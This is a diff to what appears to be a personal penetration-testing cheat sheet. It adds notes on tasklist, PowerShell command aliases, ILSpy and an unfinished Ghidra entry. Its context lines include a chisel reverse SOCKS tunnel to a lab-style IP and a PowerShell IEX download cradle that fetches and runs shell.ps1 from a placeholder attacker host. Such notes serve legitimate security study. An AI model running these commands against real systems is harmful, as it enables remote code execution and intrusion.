@@ -176,3 +176,35 @@ chisel client 10.10.14.3:8000 R:socks
 icacls - Windows command-line utility used to view, modify, back up, and restore file and directory permissions through Windows Access Control Lists (ACLs). https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls
 
 iex - this command takes a file and execute it in windows - IEX (New-Object Net.WebClient).DownloadString('http://<your-ip>:<you-port>/shell.ps1')
+
+tasklist - shows processes in windoes cmd, the /v flag makes it more specific
+
+List of powershell commands.
+Full command - Alias
+Get-Process - gps
+
+Select-Object - select
+
+Get-ChildItem - gci
+
+Where-Object - where or ?
+
+ForEach-Object - foreach or %
+
+Get-Content - gc
+
+Get-Service - gsv
+
+Get-Command - gcm
+
+Get-Help - help
+
+Set-Location - cd or sl
+
+Get-Location - pwd or gl
+
+Clear-Host - cls or clear
+
+ILSpy - ILSpy is the open-source .NET assembly browser and decompiler. It is designed to convert compiled .NET assemblies back into readable C# source code, while also providing a comprehensive metadata explorer and assembly analysis tools. - https://deepwiki.com/icsharpcode/ILSpy - https://github.com/icsharpcode/ILSpy
+
+ghidra - 
